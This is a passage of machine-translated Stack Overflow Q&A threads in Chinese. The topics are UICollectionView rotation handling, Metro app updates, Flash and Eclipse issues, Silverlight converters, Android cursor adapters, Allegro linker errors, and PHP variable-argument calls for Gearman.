- (void)willRotateToInterfaceOrientation:(UIInterfaceOrientation)toInterfaceOrientation duration:(NSTimeInterval)duration
{
    [super willRotateToInterfaceOrientation:toInterfaceOrientation duration:duration];
    _indexPathOfFirstCell = [self indexPathsForVisibleItems].firstObject;
}

- (void)willAnimateRotationToInterfaceOrientation:(UIInterfaceOrientation)toInterfaceOrientation duration:(NSTimeInterval)duration {
    [super willAnimateRotationToInterfaceOrientation:toInterfaceOrientation duration:duration];
    if (_indexPathOfFirstCell) {
        [UIView performWithoutAnimation:^{
            [self scrollToItemAtIndexPath:self->_indexPathOfFirstCell atScrollPosition:UICollectionViewScrollPositionTop animated:NO];
        }];
        _indexPathOfFirstCell = nil;
    }
} 
```

关键是使用 willRotateToInterfaceOrientation 方法确定视图中要滚动到的部分，并在视图更改其大小时重新计算它（框架调用此方法时边界已经更改）并实际上滚动到没有动画的新位置。在我的代码中，我使用第一个可视单元格的索引路径来执行此操作，但是 contentOffset.y/contentSize.height 的百分比也会以稍微不同的方式完成这项工作。

* * *

## 回答 #13

> 赞同：1
> 
> 时间：2014-06-15T14:37:48.450

我的工作是这样的：

1.  从您的我的`UICollectionViewDelegateFlowLayout`方法设置您的我的单元格的大小

    ```
    func collectionView(collectionView: UICollectionView!, layout collectionViewLayout: UICollectionViewLayout!, sizeForItemAtIndexPath indexPath: NSIndexPath!) -> CGSize
    {
        return collectionView.bounds.size
    } 
    ```

2.  之后我`willRotateToInterfaceOrientationToInterfaceOrientation:duration:`像这样实现

    ```
    override func willRotateToInterfaceOrientation(toInterfaceOrientation: UIInterfaceOrientation, duration: NSTimeInterval) 
    {
        let currentPage = Int(collectionView.contentOffset.x / collectionView.bounds.size.width)

        var width = collectionView.bounds.size.height
        UIView.animateWithDuration(duration) {
            self.collectionView.setContentOffset(CGPointMake(width * CGFloat(currentPage), 0.0), animated: false)
            self.collectionView.collectionViewLayout.invalidateLayout()
        }
    } 
    ```

上面的代码是用**Swift**编写的，但你明白了，而且很容易“翻译”

* * *

## 回答 #14

> 赞同：1
> 
> 时间：2014-11-12T13:03:43.700

这项工作就像一个魅力：

```
-(CGSize)collectionView:(UICollectionView *)collectionView layout:(UICollectionViewLayout *)collectionViewLayout sizeForItemAtIndexPath:(NSIndexPath *)indexPath {
    return self.view.bounds.size;
}

-(void)willRotateToInterfaceOrientation:(UIInterfaceOrientation)toInterfaceOrientation duration:(NSTimeInterval)duration {

    int currentPage = collectionMedia.contentOffset.x / collectionMedia.bounds.size.width;
    float width = collectionMedia.bounds.size.height;

    [UIView animateWithDuration:duration animations:^{
        [self.collectionMedia setContentOffset:CGPointMake(width * currentPage, 0.0) animated:NO];
        [[self.collectionMedia collectionViewLayout] invalidateLayout];
}];
} 
```

* * *

## 回答 #15

> 赞同：0
> 
> 时间：2014-02-27T08:44:32.147

我有一个类似的案例，我用这个

```
- (void)setFrame:(CGRect)frame
{
    CGFloat currentWidth = [self frame].size.width;
    CGFloat offsetModifier = [[self collectionView] contentOffset].x / currentWidth;

    [super setFrame:frame];

    CGFloat newWidth = [self frame].size.width;

    [[self collectionView] setContentOffset:CGPointMake(offsetModifier * newWidth, 0.0f) animated:NO];
} 
```

这是一个包含 collectionView 的视图。在superview中我也这样做

```
- (void)setFrame:(CGRect)frame
{    
    UICollectionViewFlowLayout *collectionViewFlowLayout = (UICollectionViewFlowLayout *)[_collectionView collectionViewLayout];

    [collectionViewFlowLayout setItemSize:frame.size];

    [super setFrame:frame];
} 
```

这是将单元格大小调整为全屏（确切地说是全视图；））。如果您不在这里执行此操作，则可能会出现很多错误消息，说明单元格大小大于集合视图，并且未定义此行为并且 bla bla bla .....

这些 to 方法当然可以合并到 collectionview 的一个子类或包含 collectionview 的视图中，但对于我当前的项目来说，这是合乎逻辑的方式。

* * *

## 回答 #16

> 赞同：0
> 
> 时间：2013-11-28T13:06:05.587

我的方法是使用 UICollectionViewFlowlayout 对象。

如果它水平滚动，则设置对象行间距。

```
[flowLayout setMinimumLineSpacing:26.0f]; 
```

如果它垂直滚动，则设置它的项间间距。

```
[flowLayout setMinimumInteritemSpacing:0.0f]; 
```

请注意，当您旋转屏幕时，它的行为会有所不同。就我而言，我让它水平滚动，所以 minimumlinespacing 是 26.0f。然后当它旋转到横向时看起来很可怕。我必须检查旋转并将该方向的最小线间距设置为 0.0f 以使其正确。

而已！简单的。

* * *

## 回答 #17

> 赞同：0
> 
> 时间：2013-12-05T06:26:42.070

我的项目有问题，我为 UICollectionView 使用了两种不同的布局。

```
mCustomCell *cell = [cv dequeueReusableCellWithReuseIdentifier:@"LandScapeCell" forIndexPath:indexPath];

theCustomCell *cell = [cv dequeueReusableCellWithReuseIdentifier:@"PortraitCell" forIndexPath:indexPath]; 
```

然后检查每个方向并为每个方向使用您的配置。

* * *

## 回答 #18

> 赞同：0
> 
> 时间：2013-12-05T17:12:02.313

```
-(CGSize)collectionView:(UICollectionView *)collectionView layout:(UICollectionViewLayout *)collectionViewLayout sizeForItemAtIndexPath:(NSIndexPath *)indexPath {
    CGSize pnt = CGSizeMake(70, 70);
    return pnt; }

-(UIEdgeInsets)collectionView:(UICollectionView *)collectionView layout:(UICollectionViewLayout*)collectionViewLayout insetForSectionAtIndex:(NSInteger)section {

//    UIEdgeInsetsMake(<#CGFloat top#>, <#CGFloat left#>, <#CGFloat bottom#>, <#CGFloat right#>)
    return UIEdgeInsetsMake(3, 0, 3, 0); } 
```

这样您就可以调整内容偏移量和单元格的大小。

* * *

## 回答 #19

> 赞同：0
> 
> 时间：2014-02-03T06:06:09.023

在CollectionView`<CollectionViewDelegateFlowLayout>`的方法reload data中使用and。`didRotateFromInterfaceOrientation:`

实现`collectionView:layout:sizeForItemAtIndexPath:`方法`<CollectionViewDelegateFlowLayout>`并在方法中验证界面方向并应用您自定义的每个单元格的大小。

```
- (CGSize)collectionView:(UICollectionView *)collectionView layout:(UICollectionViewLayout *)collectionViewLayout sizeForItemAtIndexPath:(NSIndexPath *)indexPath
{

    UIInterfaceOrientation orientation = [[UIApplication sharedApplication] statusBarOrientation];

    if (UIInterfaceOrientationIsPortrait(orientation)) {

        return CGSizeMake(CGFloat width, CGFloat height);

    } else {

        return CGSizeMake(CGFloat width, CGFloat height);

    }

} 
```

* * *

## 回答 #20

> 赞同：0
> 
> 时间：2013-09-24T21:00:50.577

您可能希望在它的（不正确的）动画期间隐藏 collectionView 并显示正确旋转的单元格的占位符视图。

对于一个简单的照片库，我找到了一种看起来相当不错的方法。在这里查看我的答案： [如何旋转类似于照片应用程序的 UICollectionView 并保持当前视图居中？](https://stackoverflow.com/questions/18708407/how-to-rotate-a-uicollectionview-similar-to-the-photos-app-and-keep-the-current/18991647#18991647)

* * *

## 回答 #21

> 赞同：0
> 
> 时间：2015-11-04T18:13:17.590

“只是快照”的答案是正确的方法，不需要使用快照覆盖 IMO 进行额外的平滑处理。但是，有一个问题可以解释为什么有些人看到在某些情况下没有滚动到正确的页面。在计算页面时，您希望使用高度而不是宽度。为什么？因为在调用 targetContentOffsetForProposedContentOffset 时视图几何图形已经旋转，所以宽度现在是高度。舍入也比天花板更明智。所以：

```
- (CGPoint)targetContentOffsetForProposedContentOffset:(CGPoint)proposedContentOffset
{
    NSInteger page = round(proposedContentOffset.x / self.collectionView.bounds.size.height);
    return CGPointMake(page * self.collectionView.bounds.size.width, 0);
} 
```

* * *

## 回答 #22

> 赞同：0
> 
> 时间：2018-09-06T09:25:36.890

我遇到了一些`animateAlongsideTransition`阻塞问题`animateAlongsideTransition`（请参见下面的代码）。

请注意，它在动画期间（但不是之前）被调用我的任务是使用滚动到顶部可见行来更新表格视图滚动位置（当设备上的表格视图单元格向上移动时，我遇到了 iPad旋转，因此我正在为该问题找到解决方案）。但它可能对 contentOffset 也有用。

我尝试通过以下方式解决问题：

```
- (void)viewWillTransitionToSize:(CGSize)size withTransitionCoordinator:(id<UIViewControllerTransitionCoordinator>)coordinator {
    [super viewWillTransitionToSize:size withTransitionCoordinator:coordinator];

    __weak TVChannelsListTableViewController *weakSelf = self;

    [coordinator animateAlongsideTransition:^(id<UIViewControllerTransitionCoordinatorContext>  _Nonnull context) {
        weakSelf.topVisibleRowIndexPath = [[weakSelf.tableView indexPathsForVisibleRows] firstObject];
    } completion:^(id<UIViewControllerTransitionCoordinatorContext>  _Nonnull context) {
        [weakSelf.tableView scrollToRowAtIndexPath:weakSelf.topVisibleRowIndexPath atScrollPosition:UITableViewScrollPositionTop animated:NO];
    }];
} 
```

但它没有用。例如，顶部 cel 的索引路径是 (0, 20)。但是当调用设备旋转 animateAlongsideTransition 块并且 [[weakSelf.tableView indexPathsForVisibleRows] firstObject] 返回索引路径 (0, 27)。

我认为问题在于检索`weakSelf`. 因此，为了解决我在方法调用`self.topVisibleRowIndexPath`之前移动的问题：`[coordinator animateAlongsideTransition: completion]`

```
- (void)viewWillTransitionToSize:(CGSize)size withTransitionCoordinator:(id<UIViewControllerTransitionCoordinator>)coordinator {
    [super viewWillTransitionToSize:size withTransitionCoordinator:coordinator];

    __weak TVChannelsListTableViewController *weakSelf = self;
    self.topVisibleRowIndexPath = [[weakSelf.tableView indexPathsForVisibleRows] firstObject];

    [coordinator animateAlongsideTransition:nil completion:^(id<UIViewControllerTransitionCoordinatorContext>  _Nonnull context) {
        [weakSelf.tableView scrollToRowAtIndexPath:weakSelf.topVisibleRowIndexPath atScrollPosition:UITableViewScrollPositionTop animated:NO];
    }];
} 
```

我发现的另一件有趣的事情是，在未重新定义方法时，已弃用的方法在 iOS 8.0 以后的版本`willRotateToInterfaceOrientation`中`willRotateToInterfaceOrientation`仍然可以成功调用。`viewWillTransitionToSize`

因此，在我的情况下解决问题的另一种方法是使用不推荐使用的方法而不是新方法。我认为这不是正确的解决方案，但如果其他方法不起作用，可以尝试:)

* * *

## 回答 #23

> 赞同：0
> 
> 时间：2016-04-14T12:16:45.407

我通过以下步骤解决了这个问题：

1.  **计算当前滚动的 NSIndexPath**
2.  **在 UICollectionView 中禁用滚动和分页**
3.  **将新的流布局应用到 UICollectionView**
4.  **在 UICollectionView 中启用滚动和分页**
5.  **滚动 UICollectionView 到当前的 NSIndexPath**

这是演示上述步骤的代码模板：

```
- (void)willRotateToInterfaceOrientation:(UIInterfaceOrientation)toInterfaceOrientation
                            duration:(NSTimeInterval)duration;
{
     //Calculating Current IndexPath
     CGRect visibleRect = (CGRect){.origin = self.yourCollectionView.contentOffset, .size = self.yourCollectionView.bounds.size};
     CGPoint visiblePoint = CGPointMake(CGRectGetMidX(visibleRect), CGRectGetMidY(visibleRect));
     self.currentIndexPath = [self.yourCollectionView indexPathForItemAtPoint:visiblePoint];

     //Disable Scrolling and Pagination
     [self disableScrolling];

     //Applying New Flow Layout
     [self setupNewFlowLayout];

     //Enable Scrolling and Pagination
     [self enableScrolling];
}

- (void)didRotateFromInterfaceOrientation:(UIInterfaceOrientation)fromInterfaceOrientation;
{
     //You can also call this at the End of `willRotate..` method.
     //Scrolling UICollectionView to current Index Path
     [self.yourCollectionView scrollToItemAtIndexPath:self.currentIndexPath atScrollPosition:UICollectionViewScrollPositionCenteredVertically animated:NO];
}

- (void) disableScrolling
{
    self.yourCollectionView.scrollEnabled   = false;
    self.yourCollectionView.pagingEnabled   = false;
}

- (void) enableScrolling
{
    self.yourCollectionView.scrollEnabled   = true;
    self.yourCollectionView.pagingEnabled   = true;
}

- (void) setupNewFlowLayout
{
    UICollectionViewFlowLayout* flowLayout = [[UICollectionViewFlowLayout alloc] init];
    flowLayout.sectionInset = UIEdgeInsetsMake(0, 0, 0, 0);
    flowLayout.scrollDirection = UICollectionViewScrollDirectionHorizontal;
    flowLayout.minimumInteritemSpacing = 0;
    flowLayout.minimumLineSpacing = 0;
    [flowLayout setItemSize:CGSizeMake(EXPECTED_WIDTH, EXPECTED_HEIGHT)];

    [self.yourCollectionView setCollectionViewLayout:flowLayout animated:YES];
    [self.yourCollectionView.collectionViewLayout invalidateLayout];
} 
```

我希望这有帮助。

* * *

## 回答 #24

> 赞同：-2
> 
> 时间：2012-12-08T17:20:56.093

您可能想试试这个未经测试的代码：

```
- (void) willRotateToInterfaceOrientation: (UIInterfaceOrientation) toInterfaceOrientation
                                 duration: (NSTimeInterval)         duration
{
    [UIView animateWithDuration: duration
                      animation: ^(void)
     {
       CGPoint newContentOffset = CGPointMake(self.scrollPositionBeforeRotation.x *
                                              self.collectionView.contentSize.height,
                                              self.scrollPositionBeforeRotation.y *
                                              self.collectionView.contentSize.width);
       [self.collectionView setContentOffset: newContentOffset
                                    animated: YES];
     }];
} 
```

# javascript - 强制用户更新 Metro 应用程序的正确方法是什么？

> ID：13490069
> 
> 赞同：4
> 
> 时间：2012-11-21T09:28:56.773
> 
> 标签：javascript, html, windows-8, microsoft-metro

强制用户更新 Metro 应用程序的正确方法是什么？

一个例子：
假设我们有一个名为“xyz”的 Metro 风格 (Windows 8) 应用程序。我们将“xyz”部署到 Windows 商店。一周后，我们在付款页面上发现了一个巨大的错误。所以我们应该强制用户将 xyz 应用程序更新到新版本。最好的做法是什么？Microsoft 是否提供解决方案？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-11-21T11:37:38.847

您不能强制用户更新应用程序，但您确实有一些选择......

1.  Windows 商店将自动让用户知道有可用的更新。这种行为是免费的，您无需为此编写代码。
2.  您可以通过网络提供“当前版本号”（可能只是作为静态 XML 文件）。然后，您可以让您的应用程序根据内部变量检查此数字。如果当前安装的版本比更新的版本旧，那么您可以显示“请访问商店升级”类型的消息，而不是主应用程序 UI。

这些选项都不意味着您的应用程序正在强制升级，但它们让用户知道有更新可用，如果他们不升级，该功能可能会受到影响。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-22T18:59:27.260

您可以在 Windows.ApplicationModel.Store.CurrentApp 中找到您要查找的内容 有了这个，您可以将用户从一个声明必须执行更新的对话框中转到应用商店页面。

# actionscript-3 - 如何保存 flash 和 actionscript

> ID：13490070
> 
> 赞同：0
> 
> 时间：2012-11-21T09:28:59.257
> 
> 标签：actionscript-3, flash, editing

我有一个带有源的 Flash 应用程序（聊天），即 .fla 和 7 个 .as 文件。项目保存在 CS6 中。我可以编辑我想要的，但我无法保存它。我对 Flash 和动作脚本知之甚少，所以我需要一些帮助来保存项目。谢谢！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-21T14:44:38.633

检查“编译器错误”面板。如果其中有任何内容，Flash 将拒绝执行任何命令，只会按顺序播放帧。如果那里什么都没有，那么 .fla 文件可能一开始就没有链接到代码。在“属性”->“发布”下查找“类”属性，并将其设置为主 .as 文件的名称。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-21T14:37:44.167

我假设您并没有首先编写应用程序。如果您正在尝试获取一些代码并尝试从中学习（或让它运行），请逐步进行。

首先找到应用程序的入口点。看到时间线中的任何代码？？相框上有什么吗？

*   如果是，请开始关注它。

*   如果没有，将在舞台属性中指定一个文档类...从那里开始。

除此之外，分享更多细节，以获得更好的答案......

# android - 无法导入 mainactivity，因为项目正在使用中

> ID：13490082
> 
> 赞同：9
> 
> 时间：2012-11-21T09:29:24.047
> 
> 标签：android

我正在尝试在eclipse中导入文件。

```
New->import->browse(for the path)->select the project->finish. 
```

我遵循相同的方式，但它不起作用。我收到了错误

```
Cannot import MainActivity because the project name is in use 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-21T09:50:41.800

更改项目名称或更改路径（将其保存在计算机上的位置），因为您在工作区中具有相同的项目名称。

# c# - 在silverlight中从公共类中获取特定对象

> ID：13490083
> 
> 赞同：0
> 
> 时间：2012-11-21T09:29:24.263
> 
> 标签：c#, silverlight-5.0, winrt-xaml, ivalueconverter

嘿伙计们，我有这个转换器类：

```
public class InboxItemValueConverters : IValueConverter 
{
    public object Convert(object value, System.Type targetType,
                            object parameter, CultureInfo culture)
    {
        int urgency = (int)value;
        Brush brush = new SolidColorBrush();

        if (urgency == 0)
        {
            brush = new SolidColorBrush(Colors.Green);            }
        else if (urgency == 1)
        {
            brush = new SolidColorBrush(Colors.Yellow);
        }
        else if (urgency == 2)
        {
            brush = new SolidColorBrush(Colors.Red);
        }

        return brush;
    }

    public object ConvertBack(object value,  System.Type targetType,
                              object parameter,  CultureInfo culture)
    {
        return null;
    }

    public object ConvDateToShort(object value, System.Type targetType,
                            object parameter, CultureInfo culture)
    {
        DateTime DT = (DateTime)value;
        return DT.ToShortDateString();
    }

    public object Convdateback(object value, System.Type targetType,
                  object parameter, CultureInfo culture)
    {
        return null;
    }

} 
```

这就是我第一次引用和使用它的方式：

```
<src:InboxItemValueConverters x:Key="converttocolor" />

 <Canvas Background="{Binding Urgency, Converter={StaticResource converttocolor}}" 
```

没有在课堂上，你们可以看到我那里有一个日期转换器？我将如何通过 xaml 获取该对象？想在另一个控件中转换日期，来自同一类

新的xml：

```
Text="{Binding DocDate , Converter={StaticResource converttocolor}}" 
```

提前致谢！

我正在使用 Visual Studio 2012/Windows Phone 8/C#/silverlight

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-21T09:35:53.547

您必须将日期转换器从 colorconverter 类移到它自己的类中

```
public class DateValueConverter : IValueConverter 
{
    public object Convert(object value, System.Type targetType,
                            object parameter, CultureInfo culture)
    {
        DateTime DT = (DateTime)value;
        return DT.ToShortDateString();
    }
    public object ConvertBack(object value, System.Type targetType,
                  object parameter, CultureInfo culture)
    {
        return null;
    }
} 
```

然后像你做颜色转换器一样在顶部声明它，然后将转换器更改为指向日期转换器的键

```
//This needs to be declared below the colorconverter resource
<src:DateValueConverter  x:Key="dateConverter" />

Text="{Binding DocDate , Converter={StaticResource dateConverter}}" 
```

# android - 自定义 SimpleCursorAdapter - 刷新、更新数据库

> ID：13490084
> 
> 赞同：0
> 
> 时间：2012-11-21T09:29:28.677
> 
> 标签：android, cursor, android-alertdialog, simplecursoradapter, android-context

我今天的问题与`SimpleCursorAdapter`我实施的自定义有关。这是我的活动`onCreate()`和习俗`SimpleCursorAdapter`：

```
@Override
public void onCreate(Bundle savedInstanceState){
    super.onCreate(savedInstanceState);
    customSharedPreference = getSharedPreferences("myCustomSharedPrefs", Activity.MODE_PRIVATE);
    editor = customSharedPreference.edit();

    setContentView(R.layout.activity_1);
    op = new OperationsClass(getApplicationContext());
    op.open();

    Cursor cursor = op.getList();
    startManagingCursor(cursor);

    String[] columns = new String[] { "AAA", "BBB", "CCC"};
    int[] to = new int[] { R.id.entry_aaa,R.id.entry_bbb, R.id.entry_ccc};

    MyCursorAdapter mAdapter = new MyCursorAdapter(this, R.layout.custom_entry, cursor, columns, to);

    this.setListAdapter(mAdapter);

    op.close();
} 
```

`OperationsClass`管理数据库，`getList(`) 函数返回条目的游标。

```
public class MyCursorAdapter extends SimpleCursorAdapter{

        private Context context;
        private MyCursorAdapter here = this;

        private int layout;

        public MyCursorAdapter (Context context, int layout, Cursor c, String[] from, int[] to) {
            super(context, layout, c, from, to);
            this.context = context;
            this.layout = layout;
        }

        @Override
        public View newView(final Context context, Cursor cursor, ViewGroup parent) {

            Cursor c = getCursor();

            final LayoutInflater inflater = LayoutInflater.from(context);
            View v = inflater.inflate(layout, parent, false);

            int col1 = c.getColumnIndex("aaa");
            String name1 = c.getString(col1 );
            int col2 = c.getColumnIndex("bbb");
            String name2 = c.getString(col2 );
            int col3 = c.getColumnIndex("ccc");
            int name3 = c.getInt(col3 );

            final TextView text1 = (TextView) v.findViewById(R.id.entry_aaa);
            final TextView text2 = (TextView) v.findViewById(R.id.entry_bbb);
            final TextView text3 = (TextView) v.findViewById(R.id.entry_ccc);

            text1.setText(name);
            text2.setText(name2);

            if (name3 == 0)
                text3.setText("Not checked");
            else {
                text3.setText("Checked");
                text3.setOnClickListener(new View.OnClickListener()
                    {
                        public void onClick(View view)
                        {
                        text3.setText("Not checked");
                            // Here I would like to update my DB using
                            // OperationsClass and the SharedPrefs,
                            // and refresh the ListView with the new
                            // text value.
                        }
                    });
                }
            }
            return v;
        }

        @Override
        public void bindView(View v, final Context context, Cursor c) {
            // Same operations as higher
        }
} 
```

基本上我想要实现的是`ListView`当用户点击第三列时刷新，这意味着它的值发生了变化（已经被点击或没有被点击）。同时我希望更新数据库和`SharedPreferences`（我可以创建两个类的新对象并从应用程序上下文中恢复，但这似乎很重）。

* * *

我还想知道是否有一种方法可以在`AlertDialog`打开一个活动时触发其中一个已实现的方法（在同一个应用程序中，我实际上想通过一个向我的数据库添加一个元素`AlertDialog`并制作弹出它的活动up 检索一个新游标并刷新其列表）。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-21T10:20:24.133

**“基本上我想要实现的是”**

```
@Override
protected void onListItemClick(ListView l, View v, int position, long id) {
    super.onListItemClick(l, v, position, id);
    // if (the id of selected view matches what you want) {
    boolean checked;
    if (text3.getText().toString() == "checked") {
        boolean checked = true;
    } else {
        boolean checked = false;
    }
    op.updateRead(id, checked);     
    refreshCursorAdapter();
    setSharedPrefs();
    // } 
```

**“当用户单击第三列时刷新 ListView，这意味着它的值发生了变化（已单击或未单击）。”**

```
private void refreshCursorAdapter() {
    Cursor cursor = op.getList();
    mAdapter.changeCursor(cursor);
} 
```

**“同时我希望更新数据库”**

```
private boolean updateRead(long rowId, boolean checked) {
        ContentValues args = new ContentValues();
        if (checked) { 
            args.put("read", "1"); 
        } else { 
            args.put("read", "0");  
        }
        return db.update(DB_TABLE, args, "_id =" + rowId, null) > 0;
    } 
```

**“和 SharedPrefereces”**

```
private void setSharedPrefs() {
    SharedPreferences settings = getSharedPreferences("MYPREFS", 0);
    SharedPreferences.Editor editor = settings.edit();
    if (checked) { 
        editor.putBoolean("read", false);
    } else { 
        editor.putBoolean("read", true);
    }
    editor.commit();
} 
```

**“我还想知道在打开 AlertDialog 时是否有办法在一个活动中触发其中一个已实现的方法”**

老实说，我不明白这背后的奥秘是什么。该过程将涉及将相同的代码复制并粘贴到其他事件中。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-21T10:05:05.780

> 基本上我想要实现的是当用户点击第三列时刷新 ListView，这意味着它的值发生了变化（已经被点击或没有被点击）。同时我希望更新数据库和 SharedPrefereces（我可以创建两个类的新对象并从应用程序上下文中恢复，但这似乎很重）。

首先，您不应该在`newView`方法中实现该逻辑，因为由于回收，不会为每一行调用该方法。应该仅用于构建新的行视图，仅此`newView`而已。将该`bindView`方法用于任何行逻辑。

关于`onClick`方法中的代码，我看不出你在哪里有问题。根据您的逻辑更新数据库`Cursor`，然后使用新数据再次查询数据库，然后使用`swapCursor()`新值更新适配器。这应该可行，但不是推荐的方式，主要是因为您在主 UI 线程上执行每个数据库操作。不要使用该 `startManagingCursor`方法，因为此方法在主 UI 线程上运行查询，而是查看[`Loader`](http://developer.android.com/guide/components/loaders.html)在您的活动中实现 a 以从主 UI 线程加载数据。使用 a`Loader`您将更新数据库值，然后只需重新启动`Loader`以更新列表。

> 我还想知道在打开 AlertDialog 时是否有办法在一个活动中触发已实现的方法之一（在同一个应用程序中，我实际上想通过 AlertDialog 向我的数据库中添加一个元素并使活动弹出它检索一个新的游标并刷新它的列表）。

你没有说你是如何表现出来的`AlertDialog`。如果您想在添加新元素后更新列表，请使用`AlertDialog`按钮的侦听器和与上面相同的代码。

# visual-studio-2012 - 无法在 MSVC 2012 中构建 Allegro 5 解决方案

> ID：13490085
> 
> 赞同：0
> 
> 时间：2012-11-21T09:29:29.333
> 
> 标签：visual-studio-2012, allegro5

我花了几个小时在 Visual Studio 2012 中使用 Windows 7 x64 构建我的第一个 Allegro 5 应用程序。

我已按照本教程的**所有步骤进行操作：** [http](http://wiki.allegro.cc/index.php?title=Windows,_Visual_Studio_2010_and_Allegro_5#Download) ://wiki.allegro.cc/index.php?title=Windows,_Visual_Studio_2010_and_Allegro_5#Download 这意味着 Allegro 目录位于 c:/allegro/ 中，并且所有库都已添加在调试和发布配置中。

我还将我的子系统更改为 Windows，所以现在它显示“Windows (/SUBSYSTEM:WINDOWS)”

```
1>------ Build started: Project: AllegroTesting, Configuration: Debug Win32 ------
1>main.obj : error LNK2019: unresolved external symbol __imp__al_install_system referenced in function _main
1>main.obj : error LNK2019: unresolved external symbol __imp__al_rest referenced in function _main
1>main.obj : error LNK2019: unresolved external symbol __imp__al_map_rgb referenced in function _main
1>main.obj : error LNK2019: unresolved external symbol __imp__al_create_display referenced in function _main
1>main.obj : error LNK2019: unresolved external symbol __imp__al_destroy_display referenced in function _main
1>main.obj : error LNK2019: unresolved external symbol __imp__al_flip_display referenced in function _main
1>main.obj : error LNK2019: unresolved external symbol __imp__al_clear_to_color referenced in function _main
1>c:\users\skypower\documents\visual studio 2012\Projects\AllegroTesting\Debug\AllegroTesting.exe : fatal error LNK1120: 7 unresolved externals
========== Build: 0 succeeded, 1 failed, 0 up-to-date, 0 skipped ========== 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-08T12:12:13.690

对于任何想知道的人，在 allegro.cc 论坛上的此线程中，skypower 的问题已得到解决：[Problem installed allegro 5 on vs 2012](https://www.allegro.cc/forums/thread/611478)

它归结为在遵循[相关 Allegro.cc wiki 页面上的 Visual Studio 2010 设置说明](http://wiki.allegro.cc/index.php?title=Windows,_Visual_Studio_2010_and_Allegro_5)时指定了错误的链接器输入库。确保键入 Allegro 的实际版本而不是键入`5.0.x`（即`x`应替换为次要版本，当前为 8，因此键入 的版本`5.0.8`）。

（如果您阅读该原始线程，则需要一些额外的上下文-`x`我所指的以前是`?`wiki页面的设置说明中的一个）

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-01-25T10:41:37.783

我为这个问题苦苦挣扎了很长时间，把我的头发扯掉了一半，然后我终于尝试了一些东西。我正在使用 Windows 8 和 VS2012 以及 Allegro 4.2，因为我使用旧版本是正确的。

1.  获取 4.2 二进制文件的链接 => [http://en.sourceforge.jp/projects/sfnet_alleg/downloads/allegro-bin/4.2.0/allegro-msvc6-4.2.0.zip/](http://en.sourceforge.jp/projects/sfnet_alleg/downloads/allegro-bin/4.2.0/allegro-msvc6-4.2.0.zip/)
2.  解压缩后，将有 4 个文件 => bin、include、lib 和自述文件。
3.  复制 C:\Program Files (x86)\Microsoft Visual Studio 11.0\VC 中的 include 和 lib 文件
4.  启动VS并创建一个Win32项目，当提示应用程序设置时，检查空项目并单击确定。
5.  插入源文件并粘贴此代码 =>

    ```
    #include <allegro.h>
    int main(void) {
        allegro_init();
        set_gfx_mode(GFX_SAFE, 640, 480, 0, 0);
        install_keyboard();
        textout_ex(screen, font, "Hello World!", 1, 1, 10, -1);
        textout_ex(screen, font, "Press ESCape to quit.", 1, 12, 11, -1);
        while(!key[KEY_ESC]);
        allegro_exit();
        return 0;
    }
    END_OF_MAIN() 
    ```

6.  现在右键单击解决方案资源管理器中的项目->属性->链接器->输入->附加依赖项。单击它会显示下拉菜单->编辑，然后在顶部的空白处输入“alleg.lib”->确定->确定。

7.  现在从解压的 Allegro 4.2 文件夹中复制 bin 文件夹中的 3 个 dll 文件。
8.  转到您保存项目的位置，默认是我的文档->visual studio 2012->项目。使用您的项目名称进入文件夹 - >调试文件夹。在这里，您将找到项目的 .exe 文件。在此处粘贴 dll 文件。
9.  去VS2012。按f7编译你的程序，应该没有错误。按 ctrl+f5 运行。10.你会看到一个黑色的窗口说你好，然后按 esc 退出。而已！:D

# php - 将不确定数量的参数传递给函数 - PHP

> ID：13490090
> 
> 赞同：0
> 
> 时间：2012-11-21T09:29:43.747
> 
> 标签：php, function, arguments, gearman

> **可能重复：**
> [PHP 函数的无限参数？](https://stackoverflow.com/questions/5009382/unlimited-arguments-for-php-function)
> [将未定义数量的参数转发给另一个函数](https://stackoverflow.com/questions/6422075/forward-undefined-number-of-arguments-to-another-function)

我正在设置一个 Gearman 服务器，以便“委托”在对象上执行方法，例如：

```
$user->synchronize(); 
```

或者

```
$event->publish('english', array('remote1','remote2') ); 
```

（其中 remote1 和 remote2 是远程社交网络）

我的想法是将对象、方法名称和参数（以及其他一些参数，如语言）包装成一个对象，我可以将其序列化并发送给 gearman 工作人员，如下所示：

```
 class bzkGearmanWrapper {
        public $object;
        public $method;
        public $args; 
        /*
        * @param  $object (object) any object
        * @param  $method (string) the name of the method to execute
        * @param  $args    an argument or an array containing the arguments to pass to the method
        */

    private function __construct($object, $method, $args )  { 
        $this->object = $object;
        $this->method = $method;
        $this->args = $args;
    }

    private function execute() {
        $object = $this->object;
        $method = $this->method;
        $args   = $this->args;
        return $object->{$method}($args);

    }
} 
```

然后我就可以在我的主脚本中做

```
$client =new GearmanClient();

// instead of :  $user->synchronize();
$params = new bzkGearmanWrapper($user, 'synchronize');
$client->do('execute', $params);

// instead of : $event->publish('english', array('remote1','remote2') );
$targets = array('remote1', 'remote2');
$params = new bzkGearmanWrapper($event, 'publish', array('english', $targets); 
$client->do('execute', $params); 
```

在我的齿轮工中，我可以简单地调用一个“执行”任务，比如

```
function execute($job) {
    $wrapper = unserialize( $job->workload() ); 
    return $wrapper->execute(); 
} 
```

如果我给出一个参数，上面的方法执行将起作用，但是如果我需要给出不确定数量的参数，我该怎么办。我的大部分方法使用最多 2 个参数，我可以写

```
return $object->{$method}($arg1, $arg2); 
```

一种解决方案是使用 eval()，但我宁愿避免使用它。

您知道将参数传递给函数的任何方法吗？

**编辑**

该主题已被关闭，因为它与 2 个较旧的主题重复。第一个是关于 call_user_func_array() 函数，它可以为用户函数完成这项工作，但不能为对象完成工作。第二个主题[Forward undefined number of arguments to another function](https://stackoverflow.com/questions/6422075/forward-undefined-number-of-arguments-to-another-function)提到了 ReflectionClass 的使用。我做了一些功课，这是使用[ReflectionMethod::invokeArgs](http://www.php.net/manual/en/reflectionmethod.invokeargs.php)的结果。

```
class bzkObjectWrapperException extends Exception { }

class bzkObjectWrapper {

    public $object;
    public $method;
